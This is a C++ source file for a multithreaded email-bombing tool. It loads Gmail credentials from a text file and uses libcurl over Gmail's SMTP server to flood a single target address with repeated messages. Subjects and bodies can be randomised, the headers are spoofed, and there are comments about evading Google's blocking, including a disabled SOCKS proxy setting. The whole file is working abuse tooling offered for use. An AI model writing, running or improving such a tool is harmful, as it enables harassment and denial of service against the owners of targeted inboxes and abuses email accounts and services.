#include <iostream>
#include <vector>
#include <fstream>
#include <thread>
#include <curl/curl.h>
#include <cstring>
#include <locale.h>
#include <sstream>

#define CREATE_BY		"IGORERFC"
#define VERSION			"VERSION 3.55"

using namespace std;

const string name_file_mails   = "postal.txt";	//The files must be created and located in the same folder as the program
const string name_file_text    = "text.txt";	//The files must be created and located in the same folder as the program
const string name_file_history = "history.txt";

const string google_service = "smtp://smtp.gmail.com:587" ;

unsigned long number_of_errors = 0;
unsigned long number_sequence =  0;

static std::string payloadText[11];

struct upload_status { int lines_read; };

struct account {
	string login;
	string pass;
};

struct email_content{
	string name;
	string subject;
	string body;
};

//error code
enum{
		fatalerror = 1,
		error_nof  = 0
};

//void error
void v_error(string error_text,bool fatal_or_not) 
{
	if(fatal_or_not == error_nof){
		std::cout << endl << " ERROR :" << error_text << endl << endl;
	}
	
	if(fatal_or_not == fatalerror){
		std::cout << endl << " FATAL ERROR :" << error_text << endl << endl;
		exit(-1);
	}
}

void setPayloadText(const std::string &to,
                    const std::string &from,
                    const std::string &nameFrom,
                    const std::string &subject,
                    const std::string &body)
{
    payloadText[ 0] = "Date: " ;
    payloadText[ 1] = "To: <"   + to   + ">\r\n";
    payloadText[ 2] = "From: " + nameFrom + " <sender@example.org>\r\n",
    payloadText[ 3] = "Cc: <"   + to   + "> (" + nameFrom + ")\r\n";
    payloadText[ 4] = "Message-ID: <@" + from.substr(from.find('@') + 1) + ">\r\n";
    payloadText[ 5] = "Subject: " + subject + "\r\n";
    payloadText[ 6] = "\r\n";
    payloadText[ 7] = body + "\r\n";
    payloadText[ 8] = "\r\n";
    payloadText[ 9] = "\r\n";
    payloadText[10] = "\r\n"; 
}

static size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp)
{

    static const char *pt[12] = {};

    for (int i = 0; i < 11; ++i) {
        pt[i] = payloadText[i].c_str();
    }

    pt[11] = NULL;

    struct upload_status *upload_ctx = (struct upload_status *)userp;
    const char *data;

    if ((size == 0) || (nmemb == 0) || ((size*nmemb) < 1)) {
        return 0;
    }

    data = pt[upload_ctx->lines_read];

    if (data) {
        size_t len = strlen(data);
        memcpy(ptr, data, len);
        upload_ctx->lines_read++;

        return len;
    }

    return 0;
}

//sending an email using curl
CURLcode sendEmail(const std::string &to,
                   const std::string &from,
                   const std::string &password,
                   const std::string &nameFrom,
                   const std::string &subject,
                   const std::string &body,
                   const std::string &url
)
{
    CURLcode ret = CURLE_OK;

    struct curl_slist *recipients = NULL;
    struct upload_status upload_ctx;

    upload_ctx.lines_read = 0;

    CURL *curl = curl_easy_init();

    setPayloadText(to, from, nameFrom, subject, body);

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_USERNAME,     from    .c_str());
        curl_easy_setopt(curl, CURLOPT_PASSWORD,     password.c_str());
        curl_easy_setopt(curl, CURLOPT_URL,          url     .c_str());

        curl_easy_setopt(curl, CURLOPT_USE_SSL,      (long)CURLUSESSL_ALL);

        curl_easy_setopt(curl, CURLOPT_MAIL_FROM,    ("<" + from + ">").c_str());
        recipients = curl_slist_append(recipients,   ("<" + to   + ">").c_str());

        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT,    recipients);
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
        curl_easy_setopt(curl, CURLOPT_READDATA,     &upload_ctx);
        curl_easy_setopt(curl, CURLOPT_UPLOAD,       1L);
        curl_easy_setopt(curl, CURLOPT_VERBOSE,      1L);
        
     // curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
     // curl_easy_setopt(curl, CURLOPT_PROXY, "109.194.175.135:9050");//Google blocks ;-(
        
	curl_easy_setopt(curl,CURLOPT_VERBOSE,0);
		
        ret = curl_easy_perform(curl);

        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    }

    return ret;
}

//generating a random string
string gen_random(const int len) 
{
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
	string s;
	
    for (int i = 0; i < len; ++i) {
        s += alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    return s;
}

//Determining what this string is
string what_str(string str_input)
{
	if (str_input[0] == 'r')
		return gen_random(rand() % 25 + 1);
	else
		if(str_input[0] == 's')
			return string(to_string(++number_sequence));
		else
			return str_input;
}

//Sending emails (in the amount specified by the user)
void use_threads_for_send_mail(	vector <account> emails, 
				int num_cy,
				string email_attack, 
				email_content content) 
{	
	CURLcode err;
	for (int i = 0; i < num_cy; i++)
		for (const auto & email : emails)
		{
			err = sendEmail
					(
						email_attack		 .c_str(),
						email.login		 .c_str(),
						email.pass		 .c_str(),
						what_str(content.name) 	 .c_str(),
						what_str(content.subject).c_str(),
						what_str(content.body)	 .c_str(),
						google_service		 .c_str()
					);
				if(err)
				{
					v_error("curl_easy_perform() failed: \n "+(string)curl_easy_strerror(err),error_nof);
					number_of_errors++;
				}
				else
					cout << " Sent to " + email_attack + " from " + email.login << endl;
		}
}

//Getting text from a file text.txt
string get_text_from_txt(string file_name)
{
	fstream fout;
	fout.open(file_name,std::ios::in);
	
	if (!fout.is_open())
		 v_error(" File opening error! " + file_name, fatalerror);
		 
	char file_str[200];
	string for_ret;
	
	while (fout.getline(file_str, INT_MAX)){
		for_ret += file_str;
		for_ret += '\n';		//---------------------				
	}					//            ^
	fout.close();				//            |
	for_ret[for_ret.size()-1]='\0';		//Delete this |
	return for_ret;
}

//convert 
account string_to_account(string str_input)
{
		account account_forret;
		bool b = false;
		for (int i = 0; str_input[i] != '\0'; i++) {
			if (b == true)
				account_forret.pass += str_input[i];
			if (str_input[i] != ':' && b == false)
				account_forret.login += str_input[i];
			else b = true;
		}
		if(b == false) v_error(" Invalid string! ", error_nof);
		return account_forret;
}

//Getting usernames and passwords from a file postal.txt
void get_mail_from_txt(vector <account> *emails,string file_name)
{
	stringstream text(get_text_from_txt(file_name));
   	string line;
	while(std::getline(text, line))
        	emails->push_back(string_to_account(line));
}

//Write history to the history.txt file
void write_file(string str_write,string file_name)
{
	ofstream fout;
	fout.open(file_name,std::ios::out | ios_base::app);
	
	if (!fout.is_open())
		 v_error(" File opening error! " + file_name, fatalerror);
		 
	fout << str_write;
	fout.close();
}

//preview...
void preview()
{
	cout << " CREATE BY " << CREATE_BY << endl;
	cout << " VERSION "   << VERSION   << endl << endl;
}

int main()
{
	/*Init*/
	preview();
	srand(time(NULL));
	setlocale(LC_ALL,"Rus"); //Eng also works
	
	vector <account> emails;
	
	email_content content;
	
	string email_attack;
	
	int num_threads = 0;
	int num_cy = 0;
	
	
	get_mail_from_txt(&emails,name_file_mails);
	
	std::cout << " " << emails.size() << " - GOOGLE MAIL WAS FOUND  " << endl << endl;
	
	if(!emails.size()) v_error( " There are no emails ! \n Add emails in the format gm@gmail.com:pass to file postal.txt\n Allow untrusted apps to access your account \n (・_・ヾ \n" ,fatalerror);
	
	/*Init end*/
	
	
	/*Read*/
	std::cout << " Write an email address for sending messages : "	;std::getline ( std::cin,email_attack);
	write_file(email_attack+'\n',name_file_history);
	
	std::cout << endl << " ! Write r for random  ! "<< endl;
	std::cout << " ! Write s for sequence !  "<< endl << endl;
	
	std::cout << " Enter your name : "								;std::getline ( std::cin,content.name);
	std::cout << " Enter the subject of the letter (should r/s) : "	;std::getline ( std::cin,content.subject);
	
	std::cout << endl << " ! Enter fr to use the text from the file !  " << endl << endl;
	
	std::cout << " Enter the text of the letter  : "				;std::getline ( std::cin,content.body);
	
	if(content.body == "fr") 
	{
		content.body = get_text_from_txt(name_file_text);
		cout << endl <<" The text was taken from the file successfully ! " << endl;
	}
	
	std::cout << endl << " ! r/s doesn't work here ! "<< endl << endl;
	
	std::cout << " Enter the number of cycles  ( min - 1 ) : ";
	std::cin >> num_cy;
	
	if (num_cy < 1)	v_error(" Invalid input data ",fatalerror);
	
	std::cout << endl << " Don't specify too much threads, google services will block you ( 10 < )" << endl << endl;
	std::cout << " Enter the number of threads ( min - 1 ) : ";std::cin>>num_threads;cout<<endl;
	
	if (num_threads < 1)v_error(" Invalid input data ",fatalerror);
	/*Read end*/
	
	
	/*Sending mails*/
	thread* th = new thread[num_threads];//Fine,pc is dead
	for (int i = 0; i < num_threads; i++)
		th[i] = std::thread
		(
		use_threads_for_send_mail, 
		emails, 
		num_cy,
		email_attack,
		content
		);
	for (int i = 0; i < num_threads; i++)
		th[i].join();
	/*Sending mails end*/
	
	
	/*Output of the work result*/
	cout << endl << " " << num_cy * num_threads * emails.size() - number_of_errors << " - emails sent successfully !" << endl;
	/*Output of the work result end*/
	
}
